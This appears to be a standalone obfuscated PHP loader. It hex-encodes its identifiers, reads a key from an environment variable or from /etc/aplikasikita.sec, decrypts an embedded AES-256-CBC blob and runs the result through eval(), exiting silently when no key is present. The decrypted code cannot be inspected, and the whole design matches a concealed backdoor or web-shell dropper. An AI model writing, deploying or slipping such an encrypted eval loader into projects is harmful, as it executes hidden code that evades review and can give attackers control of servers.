<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('DBtzNtQdw4iMgONN50AiZw==');

$c=base64_decode(

'TvdXBLNC1U+BsnfNBbKl7SEMfIzjWAeLHCTWD19lCuEfnFVLPEL4lOQcqExf/jMpER+pk0Uk/VL1' .
'hTWsg9aiVr/z6Q1foKPMKZ/X2ew0JMymY4csuxg6XNkrVGbcnjHkzybgexhNCOxGxBPu9XSyNBDt' .
'tiJG5IwF6hvp6i3xCalKeYgQ6L8VHELwFUftAhyZCdwyR5LSxZIeRjSNWFI+O1OKgCMlKQiDmyon' .
'N3A82aVJGi9oFk/trxgSaRxpJrXuYBNNJAXdOApF7bW2Jxom2y9TFj9X+4ha1V7ivA8i8MpXQVvf' .
'Hm/t8BWB0EXLEsgfX4FdHaEvVzOHqEISZKA3xGkf9b6pzlX62zY0KV7S5dkRvHXgKSEGRXuTeke9' .
'VayzVkDsu5EW6nzskRoz4TK/aE88VUQZTV6W20OHEXCCYN9iPKI0N3xBieekOmLYeUZwA0B6JbV+' .
'KQ5aFbpE1P5yFy5yoBZnAm/6aOg5SnU/CALxmE2dhP4AKhw5UEzwK03G+c7ngzes2vx9eZ9QZ9hs' .
'6hTxB2YkWVCoRoKxdTgX1vEGJtaL69V52IjS4Jm9f5LbUErv8IiEi5KAP0Zahz4m5S/Upe42OFyq' .
'CkRVxDxskwhjSv7M55HmM49FJGX9WqWWNWZ7zhToQHMJHuaMrN1eHQOFgSwkhbH8ySBBYbvAewZ7' .
'v6IRF2yuKZMQQN/TxnwQOAKGICuDGjF5Oaw3Jx9yuw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

